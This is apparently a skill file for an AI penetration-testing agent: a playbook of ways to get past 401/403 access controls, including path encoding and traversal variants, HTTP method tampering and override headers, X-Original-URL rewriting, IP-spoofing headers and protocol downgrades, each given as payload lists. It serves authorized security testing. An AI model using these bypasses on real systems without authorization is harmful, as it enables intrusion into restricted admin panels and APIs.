---
name: 401-403-bypass-techniques
description: >-
  401/403 bypass playbook. Use when encountering access-denied responses on admin panels, API endpoints, or restricted paths. Covers path manipulation, HTTP method tampering, header injection, protocol downgrade, and automated bypass tools.
---

# SKILL: 401/403 Bypass Techniques — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=active`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled workflow in planning and reference mode. Catalog body inspection does not authorize network interaction or state changes.
- Define an exact in-scope subject, stable baseline, one-variable test, negative control, expected evidence, and stop condition before any future activation.
- The lightweight kernel supports bounded GET/HEAD requests, file reads/searches, and explicit-port TCP connect scans only; do not emulate POST, browser, shell, or exploit operations.
- Separate a candidate hypothesis from a verified finding and cite Evidence IDs.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Comprehensive 401/403 forbidden bypass techniques. Covers path normalization tricks, HTTP method override, header-based bypasses (X-Original-URL, X-Forwarded-For), protocol version tricks, and combination attacks. baseline analyses typically know 2-3 header bypasses but miss the full matrix of path manipulation variants and verb+path combos.

## 0. RELATED ROUTING

- `authbypass-authentication-flaws` — broader auth bypass (login flaws, session handling)
- `waf-bypass-techniques` — when bypass is WAF-specific rather than access control
- `http-host-header-attacks` — Host header manipulation for routing bypass
- `request-smuggling` — smuggle past access controls entirely
- `http2-specific-attacks` — h2c smuggling to bypass proxy ACLs

---

## 1. PATH MANIPULATION BYPASSES

The core idea: the reverse proxy/WAF checks one path format, but the backend normalizes differently.

### 1.1 Trailing Slash / Missing Slash

```
/admin      → 403
/admin/     → 200  ✓ (trailing slash)
/admin/.    → 200  ✓ (trailing dot)
```

### 1.2 Case Sensitivity

```
/admin      → 403
/Admin      → 200  ✓
/ADMIN      → 200  ✓
/aDmIn      → 200  ✓
```

Works when: proxy rule is case-sensitive but backend is case-insensitive (common on Windows/IIS).

### 1.3 URL Encoding

```
/admin          → 403
/%61dmin        → 200  ✓ (encode 'a')
/admi%6e        → 200  ✓ (encode 'n')
/%61%64%6d%69%6e → 200  ✓ (full encode)
```

### 1.4 Double URL Encoding

```
/admin              → 403
/%2561dmin          → 200  ✓ (%25 = %, decoded twice: %61 → a)
/admin%252f         → 200  ✓
/admin..%252f       → 200  ✓
```

### 1.5 Unicode / UTF-8 Encoding

```
/admin          → 403
/admi%C0%AE     → 200  ✓ (overlong UTF-8 for '.')
/admi%C0%6E     → 200  ✓ (overlong encoding)
/%C0%AFadmin    → 200  ✓ (overlong '/')
```

### 1.6 Dot-Segment / Path Traversal

```
/admin          → 403
/./admin        → 200  ✓
//admin         → 200  ✓
/admin/./       → 200  ✓
/.//admin       → 200  ✓
/admin..;/      → 200  ✓ (Tomcat path parameter)
```

### 1.7 Null Byte

```
/admin          → 403
/admin%00       → 200  ✓
/admin%00.json  → 200  ✓
/%00/admin      → 200  ✓
```

### 1.8 Path Parameter Injection

```
/admin          → 403
/admin;foo=bar  → 200  ✓ (Tomcat/Java treats ; as path param)
/admin;         → 200  ✓
/admin;x        → 200  ✓
```

### 1.9 Trailing Special Characters

```
/admin%20 (space)  /admin%09 (tab)   /admin? (empty query)
/admin.json        /admin.html       /admin/~
```

### 1.10 Backslash (Windows/IIS)

```
/admin\    /admin\..\/    \..\admin
```

### 1.11 Combined Path Tricks

```
///admin///    /./admin/./    /admin/..;/admin (Tomcat)    /%2e/admin
```

---

## 2. HTTP METHOD BYPASS

### 2.1 Direct Method Change

```
GET  /admin → 403
POST /admin → 200  ✓
PUT  /admin → 200  ✓
PATCH /admin → 200  ✓
DELETE /admin → 200  ✓
OPTIONS /admin → 200  ✓ (may leak allowed methods)
TRACE /admin → 200  ✓ (may reflect headers — XST)
HEAD /admin → 200  ✓ (same as GET but no body — confirms access)
```

### 2.2 Method Override Headers

When the proxy blocks by method, but the backend reads override headers:

```http
GET /admin HTTP/1.1
X-HTTP-Method-Override: PUT

GET /admin HTTP/1.1
X-Method-Override: POST

GET /admin HTTP/1.1
X-HTTP-Method: DELETE

POST /admin HTTP/1.1
X-HTTP-Method-Override: PATCH
_method=PUT  (in POST body — Rails, Laravel)
```

### 2.3 Custom / Invalid Methods

```
FOOBAR /admin HTTP/1.1     → some ACLs only check GET/POST
GETS /admin HTTP/1.1       → typo-like methods may bypass
CONNECT /admin HTTP/1.1    → proxy may tunnel
PROPFIND /admin HTTP/1.1   → WebDAV method
MOVE /admin HTTP/1.1       → WebDAV method
```

---

## 3. HEADER-BASED BYPASS

### 3.1 URL Rewrite Headers (Nginx/IIS)

These headers tell the backend the "real" URL, bypassing proxy-level path checks:

```http
GET / HTTP/1.1
X-Original-URL: /admin

GET / HTTP/1.1
X-Rewrite-URL: /admin
```

The proxy sees `GET /` (allowed), but the backend routes to `/admin`.

### 3.2 IP Spoofing Headers (Whitelist Bypass)

Headers to try (each with values `127.0.0.1`, `10.0.0.1`, `0.0.0.0`, `::1`):

```http
X-Forwarded-For | X-Real-IP | X-Originating-IP | X-Remote-IP
X-Remote-Addr | X-Client-IP | True-Client-IP | Cluster-Client-IP
X-ProxyUser-IP | X-Custom-IP-Authorization | Forwarded: for=127.0.0.1
```

IP encoding variants: `0177.0.0.1` (octal), `2130706433` (decimal), `0x7f000001` (hex), `localhost`

### 3.3 Other Header Tricks

```http
Referer: https://target.com/admin     # Referrer check bypass
Origin: https://target.com             # Origin check bypass
Host: localhost                         # Host header manipulation
X-Forwarded-Host: localhost            # Forwarded host
Content-Type: application/json         # Content-type switch
X-Requested-With: XMLHttpRequest       # AJAX flag
```

---

## 4. PROTOCOL VERSION BYPASS

```http
# HTTP/1.0 (some ACLs only apply to HTTP/1.1)
GET /admin HTTP/1.0

# HTTP/0.9 (extremely legacy — no headers)
GET /admin

# HTTP/2 pseudo-header tricks
:method: GET
:path: /admin
:authority: target.com
# See `http2-specific-attacks` for H2-specific bypasses
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 5. VERB TAMPERING + PATH COMBINATION
- 6. TECHNOLOGY-SPECIFIC BYPASSES
- 7. AUTOMATED TOOLS
- 8. DECISION TREE
- 9. QUICK REFERENCE — KEY PAYLOADS
